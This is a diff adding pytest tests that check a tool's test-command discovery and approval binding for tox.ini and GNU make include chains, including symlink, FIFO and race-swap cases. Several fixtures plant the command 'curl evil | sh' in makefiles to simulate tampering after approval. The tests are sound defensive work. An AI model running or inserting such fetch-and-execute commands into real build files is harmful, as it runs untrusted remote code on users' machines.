@@ -5,6 +5,7 @@ from __future__ import annotations
 import hashlib
 import json
 import os
+import stat
 from pathlib import Path
 
 import pytest
@@ -195,6 +196,93 @@ def test_discovers_tox_cargo_and_make(tmp_path: Path) -> None:
     assert discover_verification_command(tmp_path).argv == ("make", "test")  # type: ignore[union-attr]
 
 
+@pytest.mark.parametrize(
+    "text",
+    [
+        "[testenv]\ncommands = python -m unittest discover\n",
+        "[testenv:py]\ncommands = python -m unittest discover\n",
+    ],
+    ids=["testenv-only", "default-py-env-only"],
+)
+def test_discovers_tox_ini_without_tox_section(tmp_path: Path, text: str) -> None:
+    # tox 4 accepts a tox.ini whose only sections are [testenv] / [testenv:NAME].
+    (tmp_path / "tox.ini").write_text(text)
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.argv == ("tox",)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "[flake8]\nmax-line-length = 88\n",
+        "[testenvironment]\nx = 1\n",
+        # Bare `tox` runs only the implicit `py` env, which has no commands here,
+        # so it would exit 0 without running the named env.
+        "[testenv:lint]\ncommands = ruff check .\n",
+        "[testenv:PY]\ncommands = python -m unittest discover\n",
+    ],
+    ids=["unrelated", "lookalike", "non-default-env-only", "wrong-case-env"],
+)
+def test_tox_ini_that_bare_tox_would_not_run_is_ignored(
+    tmp_path: Path, text: str
+) -> None:
+    (tmp_path / "tox.ini").write_text(text)
+    assert discover_verification_command(tmp_path) is None
+
+
+@pytest.mark.parametrize("shadow", ["GNUmakefile", "makefile"])
+def test_shadowed_makefile_test_target_is_ignored(tmp_path: Path, shadow: str) -> None:
+    # GNU make reads only the first existing of GNUmakefile, makefile, Makefile.
+    (tmp_path / "Makefile").write_text("test:\n\t@true\n")
+    (tmp_path / shadow).write_text("all:\n\t@true\n")
+    if {p.name for p in tmp_path.iterdir()} != {"Makefile", shadow}:
+        pytest.skip("case-insensitive filesystem")
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_gnumakefile_test_target_wins_over_makefile(tmp_path: Path) -> None:
+    (tmp_path / "Makefile").write_text("all:\n\t@true\n")
+    (tmp_path / "GNUmakefile").write_text("test:\n\t@true\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.argv == ("make", "test")
+    assert command.reason.startswith("GNUmakefile ")
+
+
+def test_gnumakefile_including_makefile_with_test_target(tmp_path: Path) -> None:
+    (tmp_path / "Makefile").write_text("test:\n\t@true\n")
+    (tmp_path / "GNUmakefile").write_text("include Makefile\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.argv == ("make", "test")
+    assert command.reason == (
+        "GNUmakefile includes Makefile, which defines a test target"
+    )
+
+
+def test_make_include_cycle_and_variable_paths_terminate(tmp_path: Path) -> None:
+    (tmp_path / "GNUmakefile").write_text("include a.mk $(EXTRA)\n")
+    (tmp_path / "a.mk").write_text("-include GNUmakefile b.mk\n")
+    (tmp_path / "b.mk").write_text("all:\n\t@true\n")
+    assert discover_verification_command(tmp_path) is None
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "[testenv]\ndeps = pytest\n",
+        "[testenv:py]\ndeps = pytest\ncommands =\n",
+    ],
+    ids=["deps-only", "empty-commands"],
+)
+def test_tox_ini_default_env_without_commands_is_ignored(
+    tmp_path: Path, text: str
+) -> None:
+    (tmp_path / "tox.ini").write_text(text)
+    assert discover_verification_command(tmp_path) is None
+
+
 def test_npm_requires_exact_test_script_and_previews_lifecycle(tmp_path: Path) -> None:
     package = tmp_path / "package.json"
     package.write_text(
@@ -259,17 +347,24 @@ def test_string_pytest_mention_does_not_discover(tmp_path: Path) -> None:
 def test_unreadable_makefile_is_skipped(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    makefile = tmp_path / "Makefile"
-    makefile.write_text("test:\n\t@true\n")
-    original = Path.read_text
+    # An unreadable GNUmakefile still shadows Makefile for make, so discovery
+    # must not fall back to it. Distinct names keep this valid on
+    # case-insensitive filesystems.
+    (tmp_path / "GNUmakefile").write_text("all:\n\t@true\n")
+    (tmp_path / "Makefile").write_text("test:\n\t@true\n")
+    real_open = os.open
+    attempted = False
 
-    def boom(self: Path, *args: object, **kwargs: object) -> str:
-        if self.name == "Makefile":
+    def boom(path: str | Path, flags: int, *args, **kwargs) -> int:
+        nonlocal attempted
+        if Path(path).name == "GNUmakefile":
+            attempted = True
             raise OSError("unreadable")
-        return original(self, *args, **kwargs)  # type: ignore[arg-type]
+        return real_open(path, flags, *args, **kwargs)
 
-    monkeypatch.setattr(Path, "read_text", boom)
+    monkeypatch.setattr(os, "open", boom)
     assert discover_verification_command(tmp_path) is None
+    assert attempted
 
 
 def test_approved_make_argv_binds_snapshot(tmp_path: Path) -> None:
@@ -414,3 +509,460 @@ def test_cleanup_ignores_child_rewritten_bound_paths(tmp_path: Path) -> None:
     restore_approved_snapshots(bind)
     assert victim.exists()
     assert not Path(argv[2]).exists()
+
+
+def test_included_makefile_edit_after_approval_is_stale(tmp_path: Path) -> None:
+    from gptme.util.completion_verification import unsnapshotted_sources_match
+
+    (tmp_path / "Makefile").write_text("test:\n\t@true\n")
+    (tmp_path / "GNUmakefile").write_text("include Makefile\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert unsnapshotted_sources_match(command)
+    # make reads the include live, outside the approved GNUmakefile snapshot.
+    (tmp_path / "Makefile").write_text("test:\n\t@curl evil | sh\n")
+    assert not unsnapshotted_sources_match(command)
+
+
+def test_recipe_line_calling_include_is_not_an_include(tmp_path: Path) -> None:
+    (tmp_path / "Makefile").write_text("all:\n\tinclude tests.mk\n")
+    (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
+    assert discover_verification_command(tmp_path) is None
+
+
+@pytest.mark.parametrize(
+    "makefile",
+    [
+        " \tinclude tests.mk\n",
+        "\tinclude tests.mk\n",
+        "all:\n\t@true\nX := 1\n\tinclude tests.mk\n",
+        "all:\n\t@true\n\n# note\nX = 1\n\tinclude tests.mk\n",
+        "all: X=1\n\tinclude tests.mk\n",
+    ],
+    ids=[
+        "space-tab",
+        "tab-at-top",
+        "tab-after-assignment",
+        "tab-after-comment",
+        "tab-after-target-specific-assignment",
+    ],
+)
+def test_blank_led_include_outside_a_rule_is_an_include(
+    tmp_path: Path, makefile: str
+) -> None:
+    """make reads these as include directives, so their targets must be bound."""
+    (tmp_path / "Makefile").write_text(makefile)
+    (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.reason == "Makefile includes tests.mk, which defines a test target"
+
+
+@pytest.mark.parametrize(
+    "makefile",
+    [
+        "all:\n\n\tinclude tests.mk\n",
+        "all:\n# note\n\tinclude tests.mk\n",
+        "all:\nifdef X\n\tinclude tests.mk\nendif\n",
+        "all: ; @true\n\tinclude tests.mk\n",
+    ],
+    ids=["after-blank", "after-comment", "inside-conditional", "inline-recipe"],
+)
+def test_tab_led_line_inside_a_rule_stays_a_recipe(
+    tmp_path: Path, makefile: str
+) -> None:
+    (tmp_path / "Makefile").write_text(makefile)
+    (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_include_symlink_loop_fails_closed(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A looping include neither crashes discovery nor yields ``make test``:
+    make cannot read it, so its content cannot be bound to the approval."""
+    (tmp_path / "GNUmakefile").write_text("include loop.mk tests.mk\n")
+    (tmp_path / "loop.mk").write_text("")
+    (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
+    real_resolve = Path.resolve
+
+    def resolve(self: Path, strict: bool = False) -> Path:
+        if self.name == "loop.mk":
+            raise RuntimeError("Symlink loop")  # Python < 3.13
+        return real_resolve(self, strict=strict)
+
+    monkeypatch.setattr(Path, "resolve", resolve)
+    assert discover_verification_command(tmp_path) is None
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "[testenv]\ncommands_pre = python -m pytest\n",
+        "[testenv]\ncommands_post = python -m pytest\n",
+        "[testenv]\ncommands = pytest\n[testenv:py]\ncommands_pre = ruff check .\n",
+    ],
+    ids=["pre-only", "post-only", "py-overrides-pre"],
+)
+def test_tox_ini_default_env_with_any_command_key_is_discovered(
+    tmp_path: Path, text: str
+) -> None:
+    (tmp_path / "tox.ini").write_text(text)
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.argv[:1] == ("tox",)
+
+
+@pytest.mark.timeout(5)
+@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="needs named pipes")
+def test_include_replaced_by_fifo_fails_fingerprint_without_blocking(
+    tmp_path: Path,
+) -> None:
+    """A followed include swapped for a FIFO after discovery must fail the
+    pre-launch check, not block on open/read before the verifier timeout."""
+    from gptme.util.completion_verification import fingerprints_match
+
+    (tmp_path / "Makefile").write_text("test:\n\t@true\n")
+    (tmp_path / "GNUmakefile").write_text("include Makefile\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert fingerprints_match(command)
+    (tmp_path / "Makefile").unlink()
+    os.mkfifo(tmp_path / "Makefile")
+    assert fingerprints_match(command) is False
+
+
+@pytest.mark.parametrize(
+    ("files", "edited"),
+    [
+        # The test target is in the top file; a later include sets its vars.
+        (
+            {"GNUmakefile": "test:\n\t$(CMD)\ninclude config.mk\n", "config.mk": ""},
+            "config.mk",
+        ),
+        # An earlier include defines test; a later one can redefine it.
+        (
+            {
+                "GNUmakefile": "include a.mk b.mk\n",
+                "a.mk": "test:\n\t@true\n",
+                "b.mk": "",
+            },
+            "b.mk",
+        ),
+        # The file defining test includes another file.
+        (
+            {
+                "GNUmakefile": "include a.mk\n",
+                "a.mk": "test:\n\t$(CMD)\ninclude c.mk\n",
+                "c.mk": "",
+            },
+            "c.mk",
+        ),
+    ],
+    ids=["after-target", "sibling-include", "nested-under-target"],
+)
+def test_every_make_include_is_fingerprinted(
+    tmp_path: Path, files: dict[str, str], edited: str
+) -> None:
+    """make reads every include, not only those before the test target."""
+    from gptme.util.completion_verification import unsnapshotted_sources_match
+
+    for name, text in files.items():
+        (tmp_path / name).write_text(text)
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert unsnapshotted_sources_match(command)
+    (tmp_path / edited).write_text("CMD = curl evil | sh\n")
+    assert not unsnapshotted_sources_match(command)
+
+
+@pytest.mark.parametrize(
+    "include",
+    [
+        "include $(EXTRA)",
+        "include *.mk",
+        "include ~/rules.mk",
+        "-include missing.mk",
+        "include loop.mk",
+    ],
+    ids=["variable", "glob", "tilde", "missing", "symlink-loop"],
+)
+def test_unaccountable_make_include_fails_closed(
+    tmp_path: Path, include: str, request: pytest.FixtureRequest
+) -> None:
+    """An include discovery cannot fingerprint must not yield ``make test``."""
+    (tmp_path / "GNUmakefile").write_text(f"test:\n\t@true\n{include}\n")
+    (tmp_path / "x.mk").write_text("")
+    if "loop" in include:
+        request.getfixturevalue("requires_symlinks")
+        (tmp_path / "loop.mk").symlink_to(tmp_path / "loop.mk")
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_include_trailing_comment_is_not_a_filename(tmp_path: Path) -> None:
+    (tmp_path / "GNUmakefile").write_text("include common.mk # see tests.mk\n")
+    (tmp_path / "common.mk").write_text("all:\n\t@true\n")
+    (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_include_escaped_hash_is_part_of_filename(tmp_path: Path) -> None:
+    (tmp_path / "GNUmakefile").write_text("include a\\#b.mk\n")
+    (tmp_path / "a#b.mk").write_text("test:\n\t@true\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.reason == "GNUmakefile includes a#b.mk, which defines a test target"
+
+
+def test_make_include_backslash_continuation_is_followed(tmp_path: Path) -> None:
+    (tmp_path / "GNUmakefile").write_text("include common.mk \\\n    tests.mk\n")
+    (tmp_path / "common.mk").write_text("all:\n\t@true\n")
+    (tmp_path / "tests.mk").write_text("test:\n\t@true\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.reason == (
+        "GNUmakefile includes tests.mk, which defines a test target"
+    )
+
+
+@pytest.mark.timeout(5)
+@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="needs named pipes")
+@pytest.mark.parametrize("when", ["before-open", "from-start"])
+def test_include_fifo_during_discovery_does_not_block(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, when: str
+) -> None:
+    """An include that is (or becomes, just before it is opened) a FIFO must
+    neither hang discovery nor be offered as part of ``make test``."""
+    (tmp_path / "GNUmakefile").write_text("include tests.mk\n")
+    tests_mk = tmp_path / "tests.mk"
+    swapped = False
+    if when == "from-start":
+        os.mkfifo(tests_mk)
+        swapped = True
+    else:
+        tests_mk.write_text("test:\n\t@true\n")
+        real_open = os.open
+
+        def swap_then_open(path, flags, *args, **kwargs):
+            nonlocal swapped
+            if Path(path) == tests_mk and not swapped:
+                tests_mk.unlink()
+                os.mkfifo(tests_mk)
+                swapped = True
+            return real_open(path, flags, *args, **kwargs)
+
+        monkeypatch.setattr(os, "open", swap_then_open)
+    command = discover_verification_command(tmp_path)
+    assert swapped
+    assert stat.S_ISFIFO(os.stat(tests_mk).st_mode)
+    assert command is None
+
+
+def test_make_fingerprints_hash_the_bytes_discovery_parsed(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """An include rewritten right after the scan parsed it must not be
+    fingerprinted from a second read: approval binds what was parsed."""
+    import gptme.util.completion_verification as cv
+
+    (tmp_path / "GNUmakefile").write_text("include tests.mk\n")
+    tests_mk = tmp_path / "tests.mk"
+    tests_mk.write_text("test:\n\t@true\n")
+    swapped = False
+    real_read_regular = cv._read_regular
+    real_read_text = Path.read_text
+
+    def swap_after_first_read(path: Path) -> None:
+        nonlocal swapped
+        if Path(path).name == "tests.mk" and not swapped:
+            swapped = True
+            real_write = Path.write_text
+            real_write(tests_mk, "test:\n\tcurl evil | sh\n")
+
+    def read_regular(path: Path) -> bytes:
+        data = real_read_regular(path)
+        swap_after_first_read(path)
+        return data
+
+    def read_text(self: Path, *args: object, **kwargs: object) -> str:
+        data = real_read_text(self, *args, **kwargs)  # type: ignore[arg-type]
+        swap_after_first_read(self)
+        return data
+
+    monkeypatch.setattr(cv, "_read_regular", read_regular)
+    monkeypatch.setattr(Path, "read_text", read_text)
+    command = discover_verification_command(tmp_path)
+    assert swapped
+    assert command is not None
+    assert dict(command.source_fingerprints)[tests_mk] == (
+        hashlib.sha256(b"test:\n\t@true\n").hexdigest()
+    )
+
+
+@pytest.mark.parametrize("backslashes", [2, 4])
+def test_make_even_trailing_backslashes_do_not_continue(
+    tmp_path: Path, backslashes: int
+) -> None:
+    """make joins a line only after an odd run of trailing backslashes.
+
+    With an even run the next line is its own ``include``, which the scanner
+    must see and fingerprint like make does.
+    """
+    trailing = "\\" * backslashes
+    (tmp_path / "GNUmakefile").write_text(f"FOO = x{trailing}\ninclude tests.mk\n")
+    tests_mk = tmp_path / "tests.mk"
+    tests_mk.write_text("test:\n\t@true\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert (
+        command.reason == "GNUmakefile includes tests.mk, which defines a test target"
+    )
+
+
+def test_make_include_symlink_alias_is_fingerprinted(
+    tmp_path: Path, requires_symlinks: None
+) -> None:
+    """An include that aliases an already-read file is still bound: make reads
+    it by its own path, so retargeting the alias must invalidate approval."""
+    from gptme.util.completion_verification import unsnapshotted_sources_match
+
+    (tmp_path / "GNUmakefile").write_text("include a.mk b.mk\n")
+    (tmp_path / "a.mk").write_text("test:\n\t@true\n")
+    (tmp_path / "b.mk").symlink_to(tmp_path / "a.mk")
+    (tmp_path / "evil.mk").write_text("test:\n\tcurl evil | sh\n")
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert unsnapshotted_sources_match(command)
+    (tmp_path / "b.mk").unlink()
+    (tmp_path / "b.mk").symlink_to(tmp_path / "evil.mk")
+    assert not unsnapshotted_sources_match(command)
+
+
+def test_make_alias_retargeted_during_scan_fails_closed(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, requires_symlinks: None
+) -> None:
+    """An alias swapped between resolve() and open() must not pass the scan.
+
+    The scanner resolves the alias to the file it already read, then reads the
+    new target's bytes. Those bytes are fingerprinted but never scanned for
+    includes, so make could load an unapproved file. Discovery must refuse.
+    """
+    from gptme.util import completion_verification
+
+    (tmp_path / "GNUmakefile").write_text("include a.mk b.mk\n")
+    (tmp_path / "a.mk").write_text("test:\n\t@true\n")
+    (tmp_path / "b.mk").symlink_to(tmp_path / "a.mk")
+    (tmp_path / "evil.mk").write_text("include evil.mk2\n")
+    (tmp_path / "evil.mk2").write_text("test:\n\t@curl evil | sh\n")
+
+    real_read = completion_verification._read_regular
+
+    def read(path: Path) -> bytes:
+        if path.name == "b.mk":
+            # The alias is retargeted after resolve() saw a.mk.
+            return (tmp_path / "evil.mk").read_bytes()
+        return real_read(path)
+
+    monkeypatch.setattr(completion_verification, "_read_regular", read)
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_self_include_binds_live_entry_point(tmp_path: Path) -> None:
+    """A makefile that includes itself is read live as well as snapshotted.
+
+    The approved snapshot runs the approved bytes, so a post-approval edit of
+    the entry point is normally irrelevant. When make also reads that same
+    path live (an ``include`` of itself), the live bytes must still be bound.
+    """
+    from gptme.util.completion_verification import unsnapshotted_sources_match
+
+    (tmp_path / "GNUmakefile").write_text(
+        "ifndef INCLUDED\nINCLUDED := 1\ninclude GNUmakefile\nendif\ntest:\n\t@true\n"
+    )
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert unsnapshotted_sources_match(command)
+    (tmp_path / "GNUmakefile").write_text(
+        "ifndef INCLUDED\nINCLUDED := 1\ninclude GNUmakefile\nendif\n"
+        "test:\n\t@curl evil | sh\n"
+    )
+    assert not unsnapshotted_sources_match(command)
+
+
+@pytest.mark.parametrize("prefix_in_include", [False, True])
+def test_make_custom_recipe_prefix_fails_closed(
+    tmp_path: Path, prefix_in_include: bool
+) -> None:
+    """A custom prefix can turn a skipped tab-led recipe into a live include.
+
+    Do not offer an approval whose include bindings depend on assuming that
+    the recipe prefix is a tab, including when another makefile changes it.
+    """
+    prefix = ".RECIPEPREFIX := >\n"
+    if prefix_in_include:
+        (tmp_path / "prefix.mk").write_text(prefix)
+        prefix = "include prefix.mk\n"
+    (tmp_path / "GNUmakefile").write_text(
+        prefix + "test: ; @echo $(CMD)\n\tinclude config.mk\n"
+    )
+    (tmp_path / "config.mk").write_text("CMD := approved\n")
+
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_inactive_rule_cannot_hide_tab_include(tmp_path: Path) -> None:
+    """An inactive rule must not make discovery skip an active live include."""
+    (tmp_path / "GNUmakefile").write_text(
+        "X := 1\nifeq (0,1)\nunused:\nendif\n"
+        "\tinclude config.mk\ntest: ; @echo $(CMD)\n"
+    )
+    (tmp_path / "config.mk").write_text("CMD := approved\n")
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_expanded_line_cannot_hide_include(tmp_path: Path) -> None:
+    (tmp_path / "GNUmakefile").write_text(
+        "$(info marker:)\n\tinclude config.mk\ntest: ; @echo $(CMD)\n"
+    )
+    (tmp_path / "config.mk").write_text("CMD := approved\n")
+    assert discover_verification_command(tmp_path) is None
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        {
+            "GNUmakefile": "include tests.mk\n",
+            "tests.mk": "ifeq (0,1)\ntest: ; @true\nendif\nall: ; @true\n",
+        },
+        {
+            "GNUmakefile": "ifeq (0,1)\ninclude tests.mk\nendif\nall: ; @true\n",
+            "tests.mk": "test: ; @true\n",
+        },
+        {
+            "GNUmakefile": "ifdef UNSET\ninclude a.mk\nendif\nall: ; @true\n",
+            "a.mk": "include tests.mk\n",
+            "tests.mk": "test: ; @true\n",
+        },
+    ],
+    ids=["target", "include", "nested-include"],
+)
+def test_make_conditional_included_target_is_not_offered(
+    tmp_path: Path, files: dict[str, str]
+) -> None:
+    """make may skip a conditional block, so it cannot vouch for ``test``."""
+    for name, text in files.items():
+        (tmp_path / name).write_text(text)
+    assert discover_verification_command(tmp_path) is None
+
+
+def test_make_unconditional_included_target_survives_conditionals(
+    tmp_path: Path,
+) -> None:
+    (tmp_path / "GNUmakefile").write_text("include tests.mk\n")
+    (tmp_path / "tests.mk").write_text(
+        "ifdef A\nifdef B\nX := 1\nendif\nelse\nX := 2\nendif\ntest: ; @true\n"
+    )
+    command = discover_verification_command(tmp_path)
+    assert command is not None
+    assert command.argv == ("make", "test")
